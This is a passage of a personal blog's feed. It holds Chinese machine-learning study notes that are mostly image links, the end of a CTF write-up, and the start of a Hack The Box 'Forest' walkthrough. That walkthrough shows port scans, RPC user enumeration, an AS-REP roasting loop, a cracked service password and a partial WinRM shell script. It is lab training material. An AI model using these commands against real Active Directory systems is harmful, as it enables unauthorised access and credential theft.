punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">301</span> bytes of ELF data so far.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">402</span> bytes of ELF data so far.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">501</span> bytes of ELF data so far.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">602</span> bytes of ELF data so far.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">701</span> bytes of ELF data so far.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">820</span> bytes of ELF data so far.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">902</span> bytes of ELF data so far.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">1001</span> bytes of ELF data so far.<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got <span class="token number">16401</span> bytes of ELF data so far.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Discovered flag: TISC20<span class="token punctuation">&#123;</span>Ch3ckp01nt_1_349ufh98hd98iwqfkoieh938<span class="token punctuation">&#125;</span><span class="token punctuation">..</span>.</code></pre><p><strong>Flag:</strong> <code>TISC20&#123;Ch3ckp01nt_1_349ufh98hd98iwqfkoieh938&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习手推笔记_09高斯混合分布</title>
    <link href="/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-09%E9%AB%98%E6%96%AF%E6%B7%B7%E5%90%88%E5%88%86%E5%B8%83/"/>
    <url>/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-09%E9%AB%98%E6%96%AF%E6%B7%B7%E5%90%88%E5%88%86%E5%B8%83/</url>
    
    <content type="html"><![CDATA[<h2 id="9-1-高斯混合模型"><a href="#9-1-高斯混合模型" class="headerlink" title="9.1 高斯混合模型"></a>9.1 高斯混合模型</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601023298496-092515100292_4IMG_20190604_202310.jpg"></p><h2 id="9-2-EM求解-e-step"><a href="#9-2-EM求解-e-step" class="headerlink" title="9.2 EM求解_e step"></a>9.2 EM求解_e step</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601023310986-092515100292_5IMG_20190604_202320.jpg"></p><h2 id="9-3-EM求解-m-step"><a href="#9-3-EM求解-m-step" class="headerlink" title="9.3 EM求解_m step"></a>9.3 EM求解_m step</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601023320665-092515100292_3IMG_20190604_201943.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>machine learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>machine learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习手推笔记_08 EM算法</title>
    <link href="/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-08-EM%E7%AE%97%E6%B3%95/"/>
    <url>/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-08-EM%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="8-1-公式及收敛性"><a href="#8-1-公式及收敛性" class="headerlink" title="8.1 公式及收敛性"></a>8.1 公式及收敛性</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601023145978-092515100292_0IMG_20190529_165754.jpg"></p><h2 id="8-2-公式导出-ELBO-KL-divergence"><a href="#8-2-公式导出-ELBO-KL-divergence" class="headerlink" title="8.2 公式导出_ELBO+KL divergence"></a>8.2 公式导出_ELBO+KL divergence</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601023158952-092515100292_1IMG_20190529_165840.jpg"></p><h2 id="8-2-公式导出-ELBO-jensen-inequity"><a href="#8-2-公式导出-ELBO-jensen-inequity" class="headerlink" title="8.2 公式导出_ELBO+jensen inequity"></a>8.2 公式导出_ELBO+jensen inequity</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601023171832-092515100292_2IMG_20190529_165909.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>machine learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>machine learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习手推笔记_07概览图</title>
    <link href="/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-07%E6%A6%82%E8%A7%88%E5%9B%BE/"/>
    <url>/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-07%E6%A6%82%E8%A7%88%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="7-1-概率图"><a href="#7-1-概率图" class="headerlink" title="7.1 概率图"></a>7.1 概率图</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022611253-092515061020_1IMG_20190403_110204.jpg"></p><h2 id="7-2-贝叶斯网络-条件独立性"><a href="#7-2-贝叶斯网络-条件独立性" class="headerlink" title="7.2 贝叶斯网络_条件独立性"></a>7.2 贝叶斯网络_条件独立性</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022632234-092515061020_2IMG_20190403_110224.jpg"></p><h2 id="7-3-贝叶斯网络-D划分"><a href="#7-3-贝叶斯网络-D划分" class="headerlink" title="7.3 贝叶斯网络_D划分"></a>7.3 贝叶斯网络_D划分</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022698847-092515061020_11IMG_20190403_110636.jpg"></p><h2 id="7-4-贝叶斯网络-模型"><a href="#7-4-贝叶斯网络-模型" class="headerlink" title="7.4 贝叶斯网络_模型"></a>7.4 贝叶斯网络_模型</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022723002-092515061020_10IMG_20190403_110626.jpg"></p><h2 id="7-5-马尔可夫随机场"><a href="#7-5-马尔可夫随机场" class="headerlink" title="7.5 马尔可夫随机场"></a>7.5 马尔可夫随机场</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022735835-092515061020_3IMG_20190403_110406.jpg"></p><h2 id="7-6-推断"><a href="#7-6-推断" class="headerlink" title="7.6 推断"></a>7.6 推断</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022764651-092515061020_4IMG_20190403_110417.jpg"></p><h2 id="7-7-推断-Variable-Elimination"><a href="#7-7-推断-Variable-Elimination" class="headerlink" title="7.7 推断_Variable Elimination"></a>7.7 推断_Variable Elimination</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022785597-092515061020_5IMG_20190403_110428.jpg"></p><h2 id="7-8-推断-BP"><a href="#7-8-推断-BP" class="headerlink" title="7.8 推断_BP"></a>7.8 推断_BP</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022809190-092515061020_0IMG_20190403_093432.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022855282-092515061020_6IMG_20190403_110440.jpg"></p><h2 id="7-9-推断-Max-product"><a href="#7-9-推断-Max-product" class="headerlink" title="7.9 推断_Max-product"></a>7.9 推断_Max-product</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022842773-092515061020_7IMG_20190403_110502.jpg"></p><h2 id="7-10-推断-道德图"><a href="#7-10-推断-道德图" class="headerlink" title="7.10 推断_道德图"></a>7.10 推断_道德图</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022871448-092515061020_9IMG_20190403_110541.jpg"></p><h2 id="7-11-推断-因子图"><a href="#7-11-推断-因子图" class="headerlink" title="7.11 推断_因子图"></a>7.11 推断_因子图</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022883907-092515061020_8IMG_20190403_110530.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>machine learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>machine learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习手推笔记_06指数族分布</title>
    <link href="/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-06%E6%8C%87%E6%95%B0%E6%97%8F%E5%88%86%E5%B8%83/"/>
    <url>/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-06%E6%8C%87%E6%95%B0%E6%97%8F%E5%88%86%E5%B8%83/</url>
    
    <content type="html"><![CDATA[<h2 id="6-1-指数族分布"><a href="#6-1-指数族分布" class="headerlink" title="6.1 指数族分布"></a>6.1 指数族分布</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022121930-092515023969_0IMG_20190313_000528.jpg"></p><h2 id="6-2-高斯分布的指数族形式"><a href="#6-2-高斯分布的指数族形式" class="headerlink" title="6.2 高斯分布的指数族形式"></a>6.2 高斯分布的指数族形式</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022193698-092515023969_4IMG_20190313_000922.jpg"></p><h2 id="6-3-对数分配函数与充分统计量的关系"><a href="#6-3-对数分配函数与充分统计量的关系" class="headerlink" title="6.3 对数分配函数与充分统计量的关系"></a>6.3 对数分配函数与充分统计量的关系</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022155314-092515023969_3IMG_20190313_000912.jpg"></p><h2 id="6-4-MLE与充分统计量的关系"><a href="#6-4-MLE与充分统计量的关系" class="headerlink" title="6.4 MLE与充分统计量的关系"></a>6.4 MLE与充分统计量的关系</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022155301-092515023969_2IMG_20190313_000835.jpg"></p><h2 id="6-5-最大熵"><a href="#6-5-最大熵" class="headerlink" title="6.5 最大熵"></a>6.5 最大熵</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022193686-092515023969_1IMG_20190313_000650.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>machine learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>machine learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习手推笔记_05 SVM</title>
    <link href="/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-05-SVM/"/>
    <url>/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-05-SVM/</url>
    
    <content type="html"><![CDATA[<h2 id="5-1-硬间隔模型"><a href="#5-1-硬间隔模型" class="headerlink" title="5.1 硬间隔模型"></a>5.1 硬间隔模型</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601021642578-092514574393_4IMG_20190306_222729.jpg"></p><h2 id="5-2-硬间隔模型求解"><a href="#5-2-硬间隔模型求解" class="headerlink" title="5.2 硬间隔模型求解"></a>5.2 硬间隔模型求解</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601021658571-092514574393_3IMG_20190306_222712.jpg"></p><h2 id="5-3-硬间隔模型KKT条件"><a href="#5-3-硬间隔模型KKT条件" class="headerlink" title="5.3 硬间隔模型KKT条件"></a>5.3 硬间隔模型KKT条件</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601021675796-092514574393_1IMG_20190306_222552.jpg"></p><h2 id="5-4-软间隔模型"><a href="#5-4-软间隔模型" class="headerlink" title="5.4 软间隔模型"></a>5.4 软间隔模型</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601021783154-092514574393_2IMG_20190306_222612.jpg"></p><h2 id="5-5-约束优化问题"><a href="#5-5-约束优化问题" class="headerlink" title="5.5 约束优化问题"></a>5.5 约束优化问题</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601021828380-092514574393_0IMG_20190306_222450.jpg"></p><h2 id="5-6-核方法"><a href="#5-6-核方法" class="headerlink" title="5.6 核方法"></a>5.6 核方法</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601021875554-092514595735_0IMG_20190310_224259.jpg"></p><h2 id="5-7-正定核"><a href="#5-7-正定核" class="headerlink" title="5.7 正定核"></a>5.7 正定核</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601021889779-092514595735_1IMG_20190310_224345.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>machine learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>machine learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习手推笔记_04降维</title>
    <link href="/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-04%E9%99%8D%E7%BB%B4/"/>
    <url>/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-04%E9%99%8D%E7%BB%B4/</url>
    
    <content type="html"><![CDATA[<h2 id="4-1-降维"><a href="#4-1-降维" class="headerlink" title="4.1 降维"></a>4.1 降维</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601020756837-092514490919_3IMG_20190306_162248.jpg"></p><h2 id="4-2-样本均值、方差的矩阵表示"><a href="#4-2-样本均值、方差的矩阵表示" class="headerlink" title="4.2 样本均值、方差的矩阵表示"></a>4.2 样本均值、方差的矩阵表示</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601020785471-092514490919_2IMG_20190306_162148.jpg"></p><h2 id="4-3-PCA的两个角度"><a href="#4-3-PCA的两个角度" class="headerlink" title="4.3 PCA的两个角度"></a>4.3 PCA的两个角度</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601021232492-092514490919_1IMG_20190306_162117.jpg"></p><h2 id="4-4-从SVD角度看PCA"><a href="#4-4-从SVD角度看PCA" class="headerlink" title="4.4 从SVD角度看PCA"></a>4.4 从SVD角度看PCA</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601020804705-092514490919_4IMG_20190306_162312.jpg"></p><h2 id="4-5-从概率角度看PCA"><a href="#4-5-从概率角度看PCA" class="headerlink" title="4.5 从概率角度看PCA"></a>4.5 从概率角度看PCA</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601021281359-092514490919_0IMG_20190306_161930.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>machine learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>machine learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习手推笔记_03线性分类</title>
    <link href="/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-03%E7%BA%BF%E6%80%A7%E5%88%86%E7%B1%BB/"/>
    <url>/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-03%E7%BA%BF%E6%80%A7%E5%88%86%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="3-1-线性分类"><a href="#3-1-线性分类" class="headerlink" title="3.1 线性分类"></a>3.1 线性分类</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601020442873-092514410325_0IMG_20190224_222853.jpg"></p><h2 id="3-2-感知机"><a href="#3-2-感知机" class="headerlink" title="3.2 感知机"></a>3.2 感知机</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601020455354-092514410325_1IMG_20190224_223155.jpg"></p><h2 id="3-3-线性判别分析"><a href="#3-3-线性判别分析" class="headerlink" title="3.3 线性判别分析"></a>3.3 线性判别分析</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601020472233-092514410325_2IMG_20190224_223252.jpg"></p><h2 id="3-4-逻辑回归"><a href="#3-4-逻辑回归" class="headerlink" title="3.4 逻辑回归"></a>3.4 逻辑回归</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601020487776-092514410325_3IMG_20190224_223433.jpg"></p><h2 id="3-5-高斯判别分析"><a href="#3-5-高斯判别分析" class="headerlink" title="3.5 高斯判别分析"></a>3.5 高斯判别分析</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601020506006-092514410325_4IMG_20190224_223458.jpg"><br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601020523613-092514410325_5IMG_20190224_223604.jpg"><br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601020534725-092514410325_6IMG_20190224_223650.jpg"></p><h2 id="3-6-朴素贝叶斯"><a href="#3-6-朴素贝叶斯" class="headerlink" title="3.6 朴素贝叶斯"></a>3.6 朴素贝叶斯</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601020550698-092514410325_7IMG_20190224_230538.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>machine learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>machine learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习手推笔记_02线性回归</title>
    <link href="/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-02%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"/>
    <url>/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-02%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/</url>
    
    <content type="html"><![CDATA[<h2 id="2-1-最小二乘法"><a href="#2-1-最小二乘法" class="headerlink" title="2.1 最小二乘法"></a>2.1 最小二乘法</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601019877048-092514380564_0IMG_20190220_121812.jpg"></p><h2 id="2-2-从概率角度看最小二乘估计"><a href="#2-2-从概率角度看最小二乘估计" class="headerlink" title="2.2 从概率角度看最小二乘估计"></a>2.2 从概率角度看最小二乘估计</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601019891849-092514380564_1IMG_20190220_123002.jpg"></p><h2 id="2-3-正则化-岭回归"><a href="#2-3-正则化-岭回归" class="headerlink" title="2.3 正则化_岭回归"></a>2.3 正则化_岭回归</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601019829920-092514380564_2IMG_20190220_230614.jpg"></p><h2 id="2-4-从概率角度看岭回归"><a href="#2-4-从概率角度看岭回归" class="headerlink" title="2.4 从概率角度看岭回归"></a>2.4 从概率角度看岭回归</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601019909034-092514380564_3IMG_20190220_230740.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>machine learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>machine learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习手推笔记_01高斯分布</title>
    <link href="/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-01%E9%AB%98%E6%96%AF%E5%88%86%E5%B8%83/"/>
    <url>/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-01%E9%AB%98%E6%96%AF%E5%88%86%E5%B8%83/</url>
    
    <content type="html"><![CDATA[<h2 id="1-频率派VS贝叶斯派"><a href="#1-频率派VS贝叶斯派" class="headerlink" title="1. 频率派VS贝叶斯派"></a>1. 频率派VS贝叶斯派</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601018421187-092514235059_0IMG_20190218_193924.jpg"></p><h2 id="2-高斯分布"><a href="#2-高斯分布" class="headerlink" title="2. 高斯分布"></a>2. 高斯分布</h2><h3 id="2-1-MLE"><a href="#2-1-MLE" class="headerlink" title="2.1 MLE"></a>2.1 MLE</h3><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601018475337-092514235059_1IMG_20190218_201319.jpg"></p><h3 id="2-2-MLE的有偏与无偏"><a href="#2-2-MLE的有偏与无偏" class="headerlink" title="2.2 MLE的有偏与无偏"></a>2.2 MLE的有偏与无偏</h3><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601018490028-092514235059_2IMG_20190218_204014.jpg"></p><h3 id="2-3-从概率密度函数看多维高斯分布"><a href="#2-3-从概率密度函数看多维高斯分布" class="headerlink" title="2.3 从概率密度函数看多维高斯分布"></a>2.3 从概率密度函数看多维高斯分布</h3><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601018502496-092514235059_3IMG_20190218_230045.jpg"></p><h3 id="2-4-局限性"><a href="#2-4-局限性" class="headerlink" title="2.4 局限性"></a>2.4 局限性</h3><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601018512611-092514235059_4IMG_20190218_232452.jpg"></p><h3 id="2-5-已知联合概率求边缘概率和条件概率"><a href="#2-5-已知联合概率求边缘概率和条件概率" class="headerlink" title="2.5 已知联合概率求边缘概率和条件概率"></a>2.5 已知联合概率求边缘概率和条件概率</h3><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601018525888-092514235059_5IMG_20190219_131702.jpg"></p><h3 id="2-6-已知边缘和条件概率就联合概率"><a href="#2-6-已知边缘和条件概率就联合概率" class="headerlink" title="2.6 已知边缘和条件概率就联合概率"></a>2.6 已知边缘和条件概率就联合概率</h3><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601018537524-092514235059_6IMG_20190219_190052.jpg"></p><h3 id="2-7-杰森不等式"><a href="#2-7-杰森不等式" class="headerlink" title="2.7 杰森不等式"></a>2.7 杰森不等式</h3><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601018574177-092514235059_7IMG_20190219_192739.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>machine learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>machine learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hack the box: Forset</title>
    <link href="/2020/09/22/Hack-the-box-Forset/"/>
    <url>/2020/09/22/Hack-the-box-Forset/</url>
    
    <content type="html"><![CDATA[<p><img src="https://p0.ssl.qhimg.com/t01040622b2d71e783a.png"></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p><strong>关于Hack the box：</strong><a href="https://www.hackthebox.eu/">Hack The Box</a>是一个全球知名的渗透测试靶机平台，在这个平台上，靶机区分为两种状态<code>active</code>、<code>retired</code>。对于<code>retired</code>状态的靶机，需要成为付费vip才能访问（£100/年或者£10/月）。</p><p><strong>关于Forest lab：</strong>我在寻找测试靶机的过程中，发现Forest在处于<code>retired</code>状态下依然可以访问，继承“白嫖一时爽，再一次更爽”的精神，今天决定对Forest下手。（前期已经白嫖过Sniper这个靶机，通过详情可参见我的上一篇安全客文章：）下图是对Sniper的简要介绍：</p><p><img src="https://p2.ssl.qhimg.com/t01a3102f9d3401b0f5.png"></p><p><img src="https://p5.ssl.qhimg.com/t014ee4fb53a8ba6db0.png"></p><p><strong>使用工具：</strong>kali、masscan、nmap、rpcclient、Impacket工具、necat、BloodHound工具、Apache、Samba、Aclpwn</p><h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h2><p>使用<code>masscan</code>对靶机Forest的ip：10.10.10.161 进行扫描:</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ masscan -e tun0 -p1-65535,U:1-65535 10.10.10.161 --rate&#x3D;1000</code></pre><p><img src="https://p3.ssl.qhimg.com/t01a777dd8e4966e96e.png"></p><p>发现一堆开放端口，貌似真的有点多。。。使用<code>nmap</code>收集对应端口的服务信息：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ nmap -n -v -Pn -p 389,135,139,49682,49674,49655,5985,3268,47001,49675,49667,53,464,636,49902,593,88,9389,49664,49666,48671,445,49701 -A --reason 10.10.10.161 -oN nmap.txt</code></pre><p><img src="https://p2.ssl.qhimg.com/t011b2b0b254b27dae0.png"></p><p>发现端口53（dns）、88（kerberos）、5985（winrm）、389/3268（ldap）、135/139/445（rpc）等。从<code>3268/tcp  open     ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</code>这条信息可以发现，靶机Forest应该是<code>htb.local</code>的域控制组。</p><p>尝试用RPC来枚举用户，使用<code>rpcclietn</code>连接，并获取用户了列表：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ rpcclient -U &quot;&quot; -N 10.10.10.161</code></pre><p><img src="https://p4.ssl.qhimg.com/t016138144cbbd07b76.png"></p><p>获取组列表：</p><p><img src="https://p5.ssl.qhimg.com/t0100adbc0a5955dc81.png"></p><p>查看<code>Domain Admins</code>以及其中的<code>0x1f4</code>成员，并发现他是Administrator：</p><p><img src="https://p2.ssl.qhimg.com/t01d1e35a802a0fe9a1.png"></p><h2 id="0x03-获得低权限的shell"><a href="#0x03-获得低权限的shell" class="headerlink" title="0x03 获得低权限的shell"></a>0x03 获得低权限的shell</h2><blockquote><p>这里的思路是沿着Kerberos认证向下进行的：Kerberos是一种非常复杂的身份验证协议，但它还存在一些缺陷。对Windows域认证体系下的Kerberos认证不了解的小伙伴，可以学习知乎上的这篇文章——<a href="https://zhuanlan.zhihu.com/p/77873456">初识 Windows域认证体系 Kerberos认证</a> 。</p><p>其中之一的缺陷就是使得攻击者可以从kerberos服务器请求数据，并对响应进行暴力攻击以找出用户密码,这就是AS-REP Roast攻击，可以参见这篇文章——<a href="http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">Roasting AS-REPs</a> 。</p><p><img src="https://p3.ssl.qhimg.com/t010acf046da3b041c3.png"></p></blockquote><p>为了验证漏洞，我开始浏览Impacket工具，找到<code>GetNPUsers.py</code>：<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py</a> 。这个脚本的功能是遍历用户列表，并找到那些<code>Do not require Kerberos preauthentication</code>即“不需要kerberos预验证”的用户。</p><p>我将所有用户保存在<code>users.txt</code>中，并执行<code>GetNPUsers.py</code>，成功获取到<code>svc-alfresco</code>账户的<code>TGT</code>hash：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ for user in $(cat users.txt);do .&#x2F;GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb&#x2F;$&#123;user&#125;; done</code></pre><p><img src="https://p2.ssl.qhimg.com/t012924f4f6d812f4fb.png"></p><p><img src="https://p0.ssl.qhimg.com/t013ae5e13aa0d298da.png"></p><p>下面就是破解hash，使用<code>hashcat</code>进行破解，得到明文密码为<code>s3rvice</code>:</p><p><img src="https://p2.ssl.qhimg.com/t01c72e6a054f030e21.png"></p><p>现在我已经拥有了一个完整的账户认证<code>svc-alfresco:s3rvice</code>，下面就是找到交互点。在nmap执行结果中，我发现端口5985是打开的，并开启<code>winrm</code>服务。为了与该服务交互，创建了一个winrm-shell脚本：</p><pre class="language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">require</span> <span class="token string">'winrm'</span>conn <span class="token operator">=</span> <span class="token constant">WinRM</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">Connection</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>  endpoint<span class="token punctuation">:</span> <span class="token string">'http://10.10.10.161:5985/wsman'</span><span class="token punctuation">,</span>  user<span class="token punctuation">:</span> <span class="token string">'svc-alfresco'</span><span class="token punctuation">,</span>  password<span class="token punctuation">:</span> <span class="token string">'s3rvice'</span><span class="token punctuation">,</span><span class="token punctuation">)</span>command<span class="token operator">=</span><span class="token string">""</span>conn<span class="token punctuation">.</span>shell<span class="token punctuation">(</span><span class="token symbol">:powershell</span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>shell<span class="token operator">|</span>    <span class="token keyword">until</span> command <span class="token operator">==</span> <span class="token string">"exit\n"</span> <span class="token keyword">do</span>        print <span 